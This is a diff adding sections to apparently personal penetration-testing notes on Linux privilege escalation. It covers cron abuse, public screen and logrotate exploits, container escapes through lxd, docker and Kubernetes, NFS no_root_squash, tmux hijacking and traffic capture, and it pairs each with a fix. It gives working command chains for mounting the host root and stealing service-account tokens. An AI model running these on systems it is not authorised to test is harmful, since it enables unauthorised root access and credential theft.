@@ -154,6 +154,36 @@ Harden: least privilege for caps, audit with `getcap -r /`, `auditd` on setcap/c
 
 > The whole module reduces to a priority list: `sudo -l` → SUID+GTFOBins → **capabilities (getcap)** → privileged groups (id) → cron/wildcards → kernel last. `getcap -r /` is the check people forget — a `cap_setuid` binary is as good as a SUID root one.
 
+## Cron job abuse (detail)
+Find a script/dir a **root cron** runs that you can write to:
+```bash
+find / -path /proc -prune -o -type f -perm -o+w -exec ls -lah {} + 2>/dev/null   # world-writable files
+cat /etc/crontab ; ls -la /etc/cron.d/ ; cat /etc/cron.d/*                        # system cron
+./pspy64 -pf -i 1000                                                              # SEE the root cron fire
+```
+If the cron'd script (or a writable `/etc/cron.d/` file) is yours to edit, append a command that runs as root (payload not stored here — the mechanism is "root executes my line"). Back up the file first, restore after. **This is one of the most common privesc paths** — pspy is how you find it.
+
+## Vulnerable service exploits (reference)
+Match the service version to a public exploit; don't store the exploit code in the repo.
+- **GNU screen ≤ 4.5.0** — SUID screen allows arbitrary file write → abuses `/etc/ld.so.preload` to load a malicious lib as root. Public PoC (compiles a small lib + root shell). Fix: patch / remove SUID.
+- **logrotate (3.8.6 / 3.11 / 3.15 / 3.18)** — race when it runs as root and you can write the rotated log → **logrotten** exploit runs your payload as root. Fix: patch, restrict log write access.
+- General pattern: `<service> --version` → searchsploit → run the PoC. Kernel exploits (DirtyCow/DirtyPipe) are the same idea, last resort.
+
+## Container escapes (privesc via group/socket)
+| Vector | Escalation |
+|---|---|
+| **lxd/lxc group** | `lxc image import <img> --alias x` → `lxc init x c -c security.privileged=true` → `lxc config device add c h disk source=/ path=/mnt/root recursive=true` → `lxc start c; lxc exec c /bin/sh` → read host root at `/mnt/root` |
+| **docker group** | `docker run -v /:/mnt -it <img> chroot /mnt bash` → host filesystem as root |
+| **writable docker.sock** | `ls -l /var/run/docker.sock` → `docker -H unix:///var/run/docker.sock run --privileged -v /:/host ...` → host root (common when not in docker group but sock is writable) |
+| **Kubernetes** | kubelet API often allows anon: `kubeletctl -i --server <node> pods` / `scan rce`; exec into a pod to steal the **service-account token** (`/var/run/secrets/kubernetes.io/serviceaccount/token`) → `kubectl --token=$T auth can-i --list` → if allowed, `apply` a privileged pod mounting host `/` → read host files |
+
+All reduce to: group membership or a writable socket → mount/chroot the host filesystem → you're root on the host. Fix: don't add users to docker/lxd, restrict the socket, no `--privileged`, strong K8s RBAC + disable anon kubelet.
+
+## Misc techniques
+- **NFS `no_root_squash`**: `showmount -e <host>` → mount the share → create a **SUID-root shell binary** on it (as root locally) → run it on the target for root. (SUID-shell C source not stored.) Fix: `root_squash` (default), NFSv4.
+- **tmux session hijack**: `ps aux | grep tmux` → if a root tmux socket is group/world-readable (`ls -la <sock>`), `tmux -S <sock> attach` → root shell. Fix: strict socket perms.
+- **Passive traffic capture**: `tcpdump -i <if> -w cap.pcap` → mine with `net-creds` / `PCredz` / `tshark` for cleartext creds + NetNTLM/Kerberos hashes. Fix: encrypt everything, segment.
+
 ## Linux hardening (defense / report side)
 - **Patching:** automate — `unattended-upgrades` (Debian/Ubuntu), `yum-cron`/`dnf-automatic` (RHEL).
 - **Config:** audit SUID/SGID + world-writable; absolute paths in cron/sudo; no creds in files/history; remove unused packages/services; SELinux or AppArmor enforcing.
